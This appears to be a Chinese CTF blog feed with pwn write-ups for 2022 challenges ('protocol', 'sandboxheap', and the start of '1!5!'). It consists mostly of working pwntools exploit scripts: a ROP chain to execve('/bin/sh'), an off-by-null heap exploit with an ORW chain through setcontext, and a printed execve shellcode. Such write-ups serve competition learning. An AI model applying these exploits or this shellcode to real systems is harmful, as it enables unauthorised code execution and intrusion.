class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctf_pb2<br>r = process(<span class="hljs-string">&#x27;protocol&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br>pop_rdi=<span class="hljs-number">0x0000000000404982</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi=<span class="hljs-number">0x0000000000588bbe</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rdx=<span class="hljs-number">0x000000000040454f</span> <span class="hljs-comment"># pop rdx ; ret</span><br>pop_rax=<span class="hljs-number">0x00000000005bdb8a</span> <span class="hljs-comment"># pop rax ; ret</span><br><span class="hljs-comment">#syscall=0x0000000000403c99 # syscall</span><br>syscall=<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(syscall))<br><span class="hljs-comment">#syscall=0x68f0a4</span><br>bss=<span class="hljs-number">0x81A2E0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">pd</span>):<br>    d=ctf_pb2.pwn()<br>    d.username=pd<br>    d.password=<span class="hljs-string">b&#x27;p&#x27;</span><br>    strs=d.SerializeToString()<br>    r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gadget</span>(<span class="hljs-params">off,val,zero_byte=<span class="hljs-number">5</span></span>):<br>    <span class="hljs-keyword">if</span> val == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(zero_byte):<br>        s(<span class="hljs-string">b&#x27;a&#x27;</span>*(off+<span class="hljs-number">7</span>-i))<br>    s(<span class="hljs-string">b&#x27;a&#x27;</span>*off+p64(val)[:(<span class="hljs-number">8</span>-zero_byte)])<br><br>gadget(<span class="hljs-number">0x1d0</span>,syscall)<br>gadget(<span class="hljs-number">0x1c8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1c0</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x1b8</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x1b0</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x1a8</span>,bss)<br>gadget(<span class="hljs-number">0x1a0</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x198</span>,<span class="hljs-number">59</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x190</span>,pop_rax)<br><br>gadget(<span class="hljs-number">0x188</span>,syscall)<br>gadget(<span class="hljs-number">0x180</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>)<br>gadget(<span class="hljs-number">0x178</span>,pop_rdx)<br>gadget(<span class="hljs-number">0x170</span>,bss)<br>gadget(<span class="hljs-number">0x168</span>,pop_rsi)<br>gadget(<span class="hljs-number">0x160</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x158</span>,pop_rdi)<br>gadget(<span class="hljs-number">0x150</span>,<span class="hljs-number">0</span>)<br>gadget(<span class="hljs-number">0x148</span>,pop_rax)<br><br>d = ctf_pb2.pwn()<br>d.username = p32(<span class="hljs-number">0xdead</span>)<br>d.password = p32(<span class="hljs-number">0xbeef</span>)<br><span class="hljs-built_in">print</span>(d.SerializeToString())<br>strs=d.SerializeToString()<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">print</span>(strs)<br>r.sendafter(<span class="hljs-string">b&#x27;Login: &#x27;</span>,strs)<br><span class="hljs-comment">#debug()</span><br>sleep(<span class="hljs-number">1</span>) <span class="hljs-comment">#need to sleep ,or might be EOF</span><br>r.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandboxheap">sandboxheap</h2><p>open与 （read和write）不能同时使用</p><p>用0x10000的功能去使用open</p><p>接着alarm软中断，</p><p>再用read，write就读出flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sandboxheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    r = process(argv = [<span class="hljs-string">&#x27;./sandbox&#x27;</span>, local_file])<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<span class="hljs-comment">#0~6</span><br>    add(i,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x28</span>)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>edit(<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">4</span>)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">12</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>)<br>show(<span class="hljs-number">10</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]+libc_base<br>info(<span class="hljs-string">&#x27;free_hook&#x27;</span>,free_hook)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br>delete(<span class="hljs-number">14</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">intToBit</span>(<span class="hljs-params">n</span>):<br>        bits = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span>:<br>            bits = <span class="hljs-built_in">str</span>(n%<span class="hljs-number">2</span>) + bits<br>            n = n//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(bits)!=<span class="hljs-number">8</span>:<br>            bits = <span class="hljs-string">&quot;0&quot;</span>+bits<br>        <span class="hljs-keyword">return</span> bits<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitToInt</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n)):<br>            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*<span class="hljs-number">2</span>**(<span class="hljs-built_in">len</span>(n)-i-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverseBits</span>(<span class="hljs-params">n</span>):<br>        <span class="hljs-keyword">if</span> n==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        bits = intToBit(n)<br>        <span class="hljs-keyword">return</span> bitToInt(bits[::-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">n</span>):<br>    n8=(n/(<span class="hljs-number">0x100000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n7=(n/(<span class="hljs-number">0x1000000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n6=(n/(<span class="hljs-number">0x10000000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n5=(n/(<span class="hljs-number">0x100000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n4=(n/(<span class="hljs-number">0x1000000</span>))&amp;<span class="hljs-number">0xff</span><br>    n3=(n/(<span class="hljs-number">0x10000</span>))&amp;<span class="hljs-number">0xff</span><br>    n2=(n/(<span class="hljs-number">0x100</span>))&amp;<span class="hljs-number">0xff</span><br>    n1=(n/<span class="hljs-number">0x1</span>)&amp;<span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n1))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n2))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n3))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n4))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n5))[<span class="hljs-number">2</span>:]).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n6))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n7))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>)+(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(reverseBits(n8))[<span class="hljs-number">2</span>:])).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><br><span class="hljs-comment">#print(hex(reverseBits(0x7f)))</span><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br><br><br>edit(<span class="hljs-number">10</span>,change(<span class="hljs-number">0x6161616161616161</span>))<br>show(<span class="hljs-number">10</span>)<br>ru(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0xa10</span>+<span class="hljs-number">0xa00</span><br>info(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>edit(<span class="hljs-number">10</span>,change(free_hook))<br><br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x18</span>)<br><br><br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x18</span>)<br><br>edit(<span class="hljs-number">15</span>,change(setcontext)  ) <br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br>read=libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]+libc_base<br>write=libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pop_rdi))<br><br>edit(<span class="hljs-number">13</span>,change(<span class="hljs-number">0x67616c66</span>))<br>flag_addr=heap_base+<span class="hljs-number">0x800</span><br><br><br><span class="hljs-comment">#orw=change(pop_rax)+&#x27;01010000&#x27;+&#x27;0&#x27;*8*7+change(pop_rdi)+change(heap_base)+change(pop_rsi)+&#x27;00000000&#x27;+&#x27;00000010&#x27;+&#x27;0&#x27;*8*6+change(pop_rdx)+&#x27;11100000&#x27;+&#x27;0&#x27;*8*7+change(syscall)+change(heap_base+0x880)</span><br><span class="hljs-comment">#orw+=change(0x622fbf4856f63148)+&#x27;10010110&#x27;+&#x27;01110110&#x27;+&#x27;11110100&#x27;+&#x27;11110100&#x27;+&#x27;11001110&#x27;+&#x27;00010110&#x27;+&#x27;11101010&#x27;+&#x27;00101010&#x27;+&#x27;11111010&#x27;+&#x27;01010110&#x27;+&#x27;11011100&#x27;+&#x27;00011010&#x27;+&#x27;10011001&#x27;+&#x27;11110000&#x27;+&#x27;10100000&#x27;+&#x27;00000000&#x27;</span><br><br>orw=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00001000&#x27;</span>+<span class="hljs-string">&#x27;11100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">6</span>+change(syscall)<br>orw+=change(pop_rdi)+change(flag_addr)+change(pop_rsi)+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">8</span>+change(pop_rax)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;01000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;10100100&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;11000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rax)+<span class="hljs-string">&#x27;00000000&#x27;</span>+<span class="hljs-string">&#x27;00000000&#x27;</span>*<span class="hljs-number">7</span>+change(syscall)<br>orw+=change(pop_rdi)+<span class="hljs-string">&#x27;10000000&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(pop_rsi)+change(flag_addr)+change(pop_rdx)+<span class="hljs-string">&#x27;00001010&#x27;</span>+<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">7</span>+change(write)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">1</span>,orw)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x198</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">0xa0</span>+change(heap_base+<span class="hljs-number">0x820</span>+<span class="hljs-number">0x10</span>)+change(ret))<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/sandboxflag.png" alt="sandboxflag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>off by null</tag>
      
      <tag>IO_leak</tag>
      
      <tag>fastbin reverse into tcache</tag>
      
      <tag>orw</tag>
      
      <tag>ret2setconext</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2022十月挑战赛pwn</title>
    <link href="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>因为实在是太菜，所以一题都没做出来，跟着<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247502987&amp;idx=1&amp;sn=39df1e5a1638db91f716f975fbeb69c1&amp;chksm=fbf456fbcc83dfedf587a21112de8e6fae17942e848974c5eafd827ab94af9d65aa87bef424b&amp;mpshare=1&amp;scene=23&amp;srcid=1025bRDnAZQ3o5bMtZAgFHMu&amp;sharer_sharetime=1666699678887&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">官方wp</a>复现一下</p><p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/rank.png" alt="rank"></p><h2 id="1-5">1!5!</h2><h3 id="0x01-确定汇编">0x01 确定汇编</h3><p>题目限制输入指定明文字符15aABCDEFGHIJKLMNOPQRSUVWXYZ，且长度要刚好0x200</p><p>先确定能还用什么汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#\x31\x35\x61\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x55\x56\x57\x58\x59\x5A</span><br>push:<br>    \x50 P  push   rax<br>    \x51        Q             push   rcx<br>    \x52        R             push   rdx<br>    \x53        S             push   rbx<br>    \x55        U             push   rbp<br>    \x56        V             push   rsi<br>    \x57        W             push   rdi<br>    \x41\x50---&gt;\x41\x57  push r8---&gt;push r15<br>pop:<br>    \x58        X             pop    rax<br>    \x59        Y             pop    rcx<br>    \x5a        Z             pop    rdx<br>    \x41\x58AX    pop    r8<br>    \x41\x59AY  pop    r9<br>    \x41\x5aAZ  pop    r10<br>xor:<br>    \x35xxxx5XXXXxor    eax,xxxx<br>    \x31\x31 xor    DWORD PTR [rcx], esi<br>    <br>    \x31xy1xy(x决定两个寄存器，y决定立即数) <br>    xor    DWORD PTR [寄存器+立即数], 寄存器<br>    例：<br>    \x31\x61\x31xor    DWORD PTR [rcx+<span class="hljs-number">0x31</span>], esp<br>    \x31\x41\x35xor    DWORD PTR [rcx+<span class="hljs-number">0x35</span>], eax<br></code></pre></td></tr></table></figure><p><code>xor eax,xxxx</code>可以异或出小于0x7f的字节</p><p>（限制字符的范围小于0x5a，二进制最高位只能为0，异或同为零，所以最大只能造出0x7f即<code>01111111</code>）</p><p><code>xor DWORD PTR [寄存器+立即数], eax</code>可以把值写入指定位置</p><p>配合<code>push</code>，<code>pop</code>等命令加上残留在<code>rdx</code>寄存器上的<code>0x10000</code>地址，可以在<code>0x10000</code>往后的地址写入小于<code>0x7f</code>字节的值，去当作命令执行</p><p>我们可以使用小于0x7f的命令，即可用一些如<code>sub byte [rax+1],cl</code>这些命令，来造出大于<code>0x7f</code>的值</p><h3 id="0x02-小于0x7f指令，写入shellcode">0x02 小于0x7f指令，写入shellcode</h3><p>我们最终目的是写shellcode当作命令执行，</p><p>我这里找了个<code>64位 较短的shellcode  23字节</code></p><p><code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p><p>有三个字节大于0x7f</p><p>小于<code>0x7f</code>的字节就用小于0x7f的命令正常写入<code>0x10000+0x200</code>后的地址，大于0x7f的三个字节由<code>sub byte 